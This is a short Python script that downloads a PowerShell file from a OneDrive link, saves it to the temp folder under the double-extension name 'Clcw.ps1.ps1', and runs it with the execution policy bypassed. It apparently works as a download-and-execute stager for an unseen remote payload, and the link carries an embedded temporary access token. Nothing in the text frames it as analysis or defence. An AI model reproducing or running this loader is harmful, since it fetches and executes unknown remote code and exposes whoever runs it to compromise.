import requests
import os
import subprocess

# Your OneDrive link
url = "https://my.microsoftpersonalcontent.com/personal/3ce6f8bdc7595cee/_layouts/15/download.aspx?UniqueId=fce1458c-1c5f-4a15-b69b-fe001711382c&Translate=false&tempauth=v1e.eyJzaXRlaWQiOiI1MWE5MjdkYS05ODQ4LTQ4YzktOGE4NC0wZGUwYjJlNmJjODkiLCJhdWQiOiIwMDAwMDAwMy0wMDAwLTBmZjEtY2UwMC0wMDAwMDAwMDAwMDAvbXkubWljcm9zb2Z0cGVyc29uYWxjb250ZW50LmNvbUA5MTg4MDQwZC02YzY3LTRjNWItYjExMi0zNmEzMDRiNjZkYWQiLCJleHAiOiIxNzUyMjUwMDM0In0.a3Ye-wTIkKr_s525PSwlzUzKyCiwcdbuYNjWwowf4TicHFmEL20aIqi49_wOmWIYa8i_7bqfUoDNXbH7DV7aIPT961t2ZqtH1ULxSdD-X4x-lMyT8FymBlZ3mkyOdV_aIk64O9P3A8AwOIFQ4MGne8WhAUr1lvD4hO5yJxcOfyODIZ_jpXwSs7jHdXBabzR5FtcxGDr1nPqYzEK4GMfFJGGukLVjGadd-FRu1fNogJKnQJCDA_2jI7MyaIbjpGhVGLyFuS8ZvZs0uLLlfU_7yMMRpJ-K4Msy5M467RWNt0rCsY97GEq8SkfhGRauzxa8LIjqBBVNis6TM1tZNahUsM4GJ6lUr3KaAhA5PHjahMkSJNjIyOBJpv6mliwDuty5gNMTTw2cPBHlw-ujM2hw_uUHPu_4a2XnjXN4Fab50ZQjsvN-oGBOuhjsSw-OYp_Xt8NPdQ6Z2lstdZg8RB36iIaqUDssFFOJT1UcPlSXxPaeJuHt8hR1EoPqPAlF8fuqhMHRrVreXRMFX6mXOFelmQ._ojZGKNFRsdnBFY0CmnZykm2qH9CJKhs7wHIWp5W1mg&ApiVersion=2.0"

# Get the system Temp folder path
temp_folder = os.environ.get('TEMP', '/tmp')
file_path = os.path.join(temp_folder, 'Clcw.ps1.ps1')

# Download the file
r = requests.get(url, allow_redirects=True)
with open(file_path, 'wb') as f:
    f.write(r.content)

print(f"File downloaded to {file_path}")

# Execute the downloaded PS1 script
try:
    subprocess.run(["powershell.exe", "-ExecutionPolicy", "Bypass", "-File", file_path], check=True)
    print("PowerShell script executed successfully.")
except subprocess.CalledProcessError as e:
    print(f"Error executing PowerShell script: {e}")
